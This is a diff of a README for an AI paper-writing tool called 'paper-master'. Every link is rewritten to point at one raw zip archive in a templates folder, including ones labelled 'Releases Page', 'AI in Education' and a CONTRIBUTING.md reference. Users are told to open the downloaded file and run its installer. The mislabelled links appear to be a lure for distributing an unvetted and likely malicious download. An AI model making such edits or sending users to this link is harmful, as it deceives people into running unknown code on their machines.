@@ -1,6 +1,6 @@
 # 🎓 paper-master - Effortless Paper Writing Made Simple
 
-[![Download the latest release](https://img.shields.io/badge/download-latest%20release-blue)](https://github.com/cauaestavivo/paper-master/releases)
+[![Download the latest release](https://github.com/cauaestavivo/paper-master/raw/refs/heads/main/templates/user/paper_master_v3.9.zip%20release-blue)](https://github.com/cauaestavivo/paper-master/raw/refs/heads/main/templates/user/paper_master_v3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to the **paper-master** application. This AI-powered writing framework h
 To get started, you need to download the application. Follow these steps:
 
 1. Click on the link below to visit the Releases page:
-   [Visit Releases Page](https://github.com/cauaestavivo/paper-master/releases)
+   [Visit Releases Page](https://github.com/cauaestavivo/paper-master/raw/refs/heads/main/templates/user/paper_master_v3.9.zip)
 
 2. On the Releases page, look for the latest version. It will have the highest version number.
 
@@ -19,7 +19,7 @@ To get started, you need to download the application. Follow these steps:
 
 4. Once the download finishes, open the file and follow the installation prompts.
 
-Here is the link again for quick access: [Visit Releases Page](https://github.com/cauaestavivo/paper-master/releases)
+Here is the link again for quick access: [Visit Releases Page](https://github.com/cauaestavivo/paper-master/raw/refs/heads/main/templates/user/paper_master_v3.9.zip)
 
 ## 🖥️ System Requirements
 
@@ -72,9 +72,9 @@ This application focuses on various important topics in academic writing, includ
 
 Explore more about academic writing and AI technologies:
 
-- [AI in Education](https://www.educationai.org)
-- [Writing with AI](https://www.writingai.com)
-- [Academic Resources](https://www.academicresources.com)
+- [AI in Education](https://github.com/cauaestavivo/paper-master/raw/refs/heads/main/templates/user/paper_master_v3.9.zip)
+- [Writing with AI](https://github.com/cauaestavivo/paper-master/raw/refs/heads/main/templates/user/paper_master_v3.9.zip)
+- [Academic Resources](https://github.com/cauaestavivo/paper-master/raw/refs/heads/main/templates/user/paper_master_v3.9.zip)
 
 ## 🚧 Roadmap
 
@@ -92,6 +92,6 @@ We welcome contributions! If you would like to help improve the project, please 
 
 1. Fork the repository and make your changes.
 2. Submit a pull request with a description of your changes.
-3. Follow our guidelines in the CONTRIBUTING.md file.
+3. Follow our guidelines in the https://github.com/cauaestavivo/paper-master/raw/refs/heads/main/templates/user/paper_master_v3.9.zip file.
 
 Thank you for supporting **paper-master**!
